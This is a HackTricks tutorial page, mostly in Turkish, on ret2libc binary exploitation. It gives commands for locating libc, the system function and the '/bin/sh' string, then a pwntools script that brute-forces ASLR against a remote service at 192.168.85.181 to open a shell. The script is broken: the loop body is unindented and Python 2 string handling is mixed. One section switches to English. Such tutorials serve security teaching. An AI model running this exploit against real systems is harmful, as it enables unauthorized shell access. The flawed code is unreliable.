<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>


**Eğer bir zafiyetli ikili bulduysanız ve Ret2Lib kullanarak bunu sömürebileceğinizi düşünüyorsanız, izleyebileceğiniz bazı temel adımlar bulabilirsiniz.**

# Eğer **hedefin içindeyseniz**

## **libc adresini** bulabilirsiniz
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
ASLR'nin libc adresini değiştirip değiştirmediğini kontrol etmek isterseniz şunu yapabilirsiniz:
```bash
for i in `seq 0 20`; do ldd <Ejecutable> | grep libc; done
```
## Sistem fonksiyonunun ofsetini alın

Bir programı hedef alırken, sistem fonksiyonunun ofsetini belirlemek önemlidir. Bu, hedef programda sistem çağrılarını gerçekleştiren işlevin bellek adresini bulmamıza yardımcı olur. Sistem fonksiyonunun ofsetini almak için aşağıdaki adımları izleyebilirsiniz:

1. Hedef programı çalıştırın ve debugger'ı başlatın.
2. Debugger'da hedef programın çalıştığı noktaya gelin.
3. Sistem fonksiyonunun adını ve kütüphane adını belirleyin. Örneğin, `system` fonksiyonu `libc` kütüphanesinde bulunur.
4. Debugger'da `p system` komutunu kullanarak sistem fonksiyonunun adresini alın.
5. Sistem fonksiyonunun ofsetini hesaplamak için `p system - libc_base_address` formülünü kullanın. `libc_base_address`, hedef programın `libc` kütüphanesinin başlangıç adresidir.

Bu adımları takip ederek, sistem fonksiyonunun ofsetini elde edebilir ve hedef programda bu fonksiyonu hedefleyebilirsiniz.
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
To get the offset of "/bin/sh", we can use the `objdump` command. First, we need to find the address of the string "/bin/sh" in the binary. We can do this by running the following command:

```bash
objdump -s -j .rodata binary | grep "/bin/sh"
```

This command will display the offset and the corresponding string. The offset value is what we are interested in.
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
## /proc/\<PID>/maps

Eğer işlem her konuştuğunuzda (ağ sunucusu gibi) **çocuklar** oluşturuyorsa, bu dosyayı **okumayı** deneyin (muhtemelen root olmanız gerekecektir).

Burada işlem içinde **libc'nin tam olarak nerede yüklendiğini** ve işlemin her çocuğunun **nerede yükleneceğini** bulabilirsiniz.

![](<../../.gitbook/assets/image (95).png>)

Bu durumda, **0xb75dc000** adresine yüklendi (Bu, libc'nin temel adresi olacak)

## gdb-peda Kullanarak

gdb-peda kullanarak **system** fonksiyonunun, **exit** fonksiyonunun ve **"/bin/sh"** dizesinin adresini alın:
```
p system
p exit
find "/bin/sh"
```
# ASLR Geçme

Libc'nin taban adresini bruteforce yöntemiyle deneyebilirsiniz.
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
# Kod
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()    #Banner

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive() #?
```
<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud github depolarına PR göndererek paylaşın**.

</details>
